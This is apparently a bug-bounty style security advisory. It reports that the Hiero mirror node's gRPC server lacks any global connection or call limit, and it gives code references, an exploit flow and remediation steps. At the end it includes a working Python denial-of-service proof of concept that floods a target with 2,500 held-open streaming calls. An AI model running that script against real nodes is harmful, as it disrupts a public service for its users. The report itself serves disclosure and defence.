### Title
Unbounded Multi-Connection gRPC Flood Saturates `applicationTaskExecutor` (No Rate-Limiting Interceptor)

### Summary
`grpcServerConfigurer()` configures only a per-connection concurrency cap (`maxConcurrentCallsPerConnection = 5`) and delegates all call execution to the shared `applicationTaskExecutor`, but imposes no limit on the total number of accepted connections and registers no rate-limiting or circuit-breaking `ServerInterceptor`. An unprivileged attacker can open an arbitrary number of TCP connections and issue 5 concurrent streaming calls on each, driving an unbounded number of tasks into the executor's queue and starving legitimate subscribers.

### Finding Description
**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, `grpcServerConfigurer()`, lines 28–35:

```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);          // line 32
    serverBuilder.maxConcurrentCallsPerConnection(            // line 33
        nettyProperties.getMaxConcurrentCallsPerConnection());
};
```

`maxConcurrentCallsPerConnection` defaults to `5` (`NettyProperties.java` line 14). This is a **per-connection** ceiling only — Netty gRPC imposes no cap on the total number of accepted connections and no cap on total concurrent calls across all connections.

**No production `ServerInterceptor` exists.** A grep of `grpc/src/main/java` for `GlobalServerInterceptor` or `ServerInterceptor` returns zero matches. The only `GrpcInterceptor` in the repository lives under `grpc/src/test/java` and only sets an `EndpointContext` thread-local — it is never loaded in production. The `web3` module's bucket4j throttle (`ThrottleConfiguration`, `ThrottleManagerImpl`) is entirely separate and does not apply to the gRPC service.

**Root cause / failed assumption:** The design assumes that `maxConcurrentCallsPerConnection = 5` is a sufficient DoS guard. It is not: it bounds concurrency *per connection* but places no bound on the number of connections. Spring Boot's `applicationTaskExecutor` uses an unbounded task queue (`Integer.MAX_VALUE` capacity by default), so every call dispatched from every connection enqueues a task that is never rejected.

**Exploit flow:**
1. Attacker opens *N* TCP connections to port 5600 (no TLS required by default, no authentication).
2. On each connection the attacker immediately issues 5 concurrent server-streaming calls (`subscribeTopic` or `getNodes`).
3. Netty accepts all connections and dispatches 5·N tasks to `applicationTaskExecutor`.
4. The executor's thread pool and queue fill; legitimate subscriber tasks queue behind attacker tasks or are never scheduled.
5. Attacker keeps connections alive (gRPC streaming calls have no server-side timeout configured in `grpcServerConfigurer`); the executor remains saturated indefinitely.

### Impact Explanation
The gRPC mirror node is the sole interface through which clients subscribe to Hedera Consensus Service topic messages and retrieve the live address book. Saturating `applicationTaskExecutor` prevents new subscriptions from being processed and stalls existing ones, effectively making the mirror node's gRPC surface unavailable. Because the executor is shared across all Spring async work in the process, database-polling listeners and retriever threads may also be starved, compounding the outage. This maps directly to the stated severity: inability to serve topic-message streams to downstream applications that depend on them for transaction confirmation visibility.

### Likelihood Explanation
**Preconditions:** None beyond network reachability to port 5600. No credentials, no API key, no prior state.
**Tooling:** Any gRPC client library (e.g., `grpcurl`, the Java gRPC stub, Python `grpcio`) can open hundreds of connections and issue streaming calls in a loop. A single commodity machine with a 1 Gbps NIC can sustain thousands of concurrent gRPC connections.
**Repeatability:** The attack is trivially repeatable and self-sustaining as long as the attacker holds the connections open. Recovery requires either restarting the process or deploying an external load-balancer ACL.

### Recommendation
1. **Add a `ServerInterceptor` that enforces a global concurrent-call budget** (e.g., using a `Semaphore` or a token-bucket) and returns `Status.RESOURCE_EXHAUSTED` when the budget is exceeded. Register it via `@GlobalServerInterceptor` or `serverBuilder.intercept(...)` inside `grpcServerConfigurer`.
2. **Cap total accepted connections** via `NettyServerBuilder.maxConnectionsPerIp(...)` or a Netty `ChannelHandler` that counts active channels per remote address.
3. **Configure `applicationTaskExecutor` with a bounded queue and a `CallerRunsPolicy` or `AbortPolicy`** so that overload is surfaced as back-pressure rather than silent queue growth.
4. **Set `maxConnectionAge` / `maxConnectionIdle`** on the `NettyServerBuilder` to reclaim connections held open by abusive clients.
5. **Add `maxConcurrentCallsTotal`** (a new `NettyProperties` field) and call `serverBuilder.maxConcurrentCallsPerConnection` in conjunction with a global semaphore interceptor.

### Proof of Concept
```python
import grpc
import threading
from com_hedera_mirror_api.proto import consensus_service_pb2_grpc
from com_hedera_mirror_api.proto import consensus_service_pb2

TARGET = "mirror-node-host:5600"
NUM_CONNECTIONS = 500   # open 500 independent channels
CALLS_PER_CONN  = 5     # maxConcurrentCallsPerConnection default

def flood(channel_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = consensus_service_pb2.ConsensusTopicQuery(
        topicID=...,  # any valid or invalid topic
        consensusStartTime=None,
    )
    # Open 5 concurrent streaming calls on this connection
    streams = [stub.subscribeTopic(req) for _ in range(CALLS_PER_CONN)]
    # Hold them open indefinitely
    for s in streams:
        try:
            for _ in s:
                pass
        except Exception:
            pass

threads = [threading.Thread(target=flood, args=(i,)) for i in range(NUM_CONNECTIONS)]
for t in threads:
    t.start()
# 500 connections × 5 calls = 2500 concurrent tasks in applicationTaskExecutor
# Legitimate subscribers receive no responses; executor queue grows without bound.
```

**Expected result:** `applicationTaskExecutor` queue depth climbs to thousands of entries; new legitimate `subscribeTopic` calls either time out or are never serviced; Micrometer metric `executor.queued.tasks{name=applicationTaskExecutor}` shows unbounded growth.